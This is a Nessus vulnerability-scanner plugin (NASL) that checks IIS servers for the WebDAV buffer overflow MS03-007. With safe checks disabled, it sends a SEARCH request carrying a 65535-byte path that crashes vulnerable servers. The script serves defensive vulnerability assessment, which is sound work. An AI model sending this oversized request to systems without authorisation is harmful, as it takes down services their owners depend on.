#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
# Tested on :
#	    W2K SP3 + the fix -> IIS issues an error
#	    W2K SP3 -> IIS temporarily crashes
#	    W2K SP2 -> IIS temporarily crashes
# 	    W2K SP1 -> IIS does not crash, but issues a message
#		       about an internal error
#	    
#	    W2K     -> IIS does not crash, but issues a message about
#		       an internal error
#

if(description)
{
  script_id(11412);
  script_version ("$Revision: 1.12 $");
 
  script_bugtraq_id(7116);
  script_cve_id("CAN-2003-0109");
  if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2003-A-0005");
  name["english"] = "IIS : WebDAV Overflow (MS03-007)";

  script_name(english:name["english"], francais:name["francais"]);
  desc["english"] = "
The remote WebDAV server is vulnerable to a buffer overflow when
it receives a too long request.

An attacker may use this flaw to execute arbitrary code within the 
LocalSystem security context.

Solution : See http://www.microsoft.com/technet/security/bulletin/ms03-007.asp
Risk Factor : High";

  

 script_description(english:desc["english"]);

 summary["english"] = "WebDAV buffer overflow";

 script_summary(english:summary["english"], francais:summary["francais"]);
 script_category(ACT_MIXED_ATTACK);  

 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
     	 	  francais:"Ce script est Copyright (C) 2003 Renaud Deraison");

 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";

 script_family(english:family["english"], francais:family["francais"]);

 script_dependencie("find_service.nes", "http_version.nasl", "smb_nt_ms03-007.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/iis");
 exit(0);
}

include("http_func.inc");



port = get_kb_item("Services/www");
if(!port) port = 80;

if(get_port_state(port))
{
  
  if( safe_checks() == 0)
  {
  
  # Safe checks are disabled, we really check for the flaw (at the
  # expense of crashing IIS
  
  if(http_is_dead(port:port))exit(0);
  soc = http_open_socket(port);
  if(soc)
  {
 	 body = 
	     '<?xml version="1.0"?>\r\n' +
	     '<g:searchrequest xmlns:g="DAV:">\r\n' +
	     '<g:sql>\r\n' +
	     'Select "DAV:displayname" from scope()\r\n' +
	     '</g:sql>\r\n' +
	     '</g:searchrequest>\r\n';
	     
	 # This is where the flaw lies. SEARCH /AAAA.....AAAA crashes
	 # the remote server. The buffer has to be 65535 or 65536 bytes
	 # long, nothing else
	 
 	 req = string("SEARCH /", crap(65535), " HTTP/1.1\r\n",
    	     "Host: ", get_host_name(), "\r\n",
	     "Content-Type: text/xml\r\n",
	     "Content-Length: ", strlen(body), "\r\n\r\n",
	     body);
	     
	     
  	send(socket:soc, data:req);
 	r = http_recv(socket:soc);
 	http_close_socket(soc);
 	if(!r)
  	{
   	 	if(http_is_dead(port:port))security_hole(port);
   	}
	else if(egrep(pattern:"HTTP/1\.[0-1] 500 ", string:r) &&
		"(exception)" >< r){security_hole(port);}
   	}
   }
   else # Safe checks are enabled, we only check for the presence of WebDAV by
        # sending an invalid request
   {
    if(get_kb_item("SMB/Hotfixes/Q815021"))exit(0);
    soc = http_open_socket(port);
    if(soc)
    {	
 	 req = http_get(item:"/", port:port);
	 req = ereg_replace(pattern:"^GET ", string:req, replace:"SEARCH ");
  	send(socket:soc, data:req);
 	r = http_recv(socket:soc);
 	http_close_socket(soc);
 	if(egrep(pattern:"^HTTP/.* 411 ", string:r))
	{
		report = "
The remote WebDAV server may be vulnerable to a buffer overflow when
it receives a too long request.

An attacker may use this flaw to execute arbitrary code within the 
LocalSystem security context.

*** As safe checks are enabled, Nessus did not actually test for this
*** flaw, so this might be a false positive

Solution : See http://www.microsoft.com/technet/security/bulletin/ms03-007.asp
Risk Factor : High";
		security_hole(port:port, data:report);
	}  
    }
   }
}
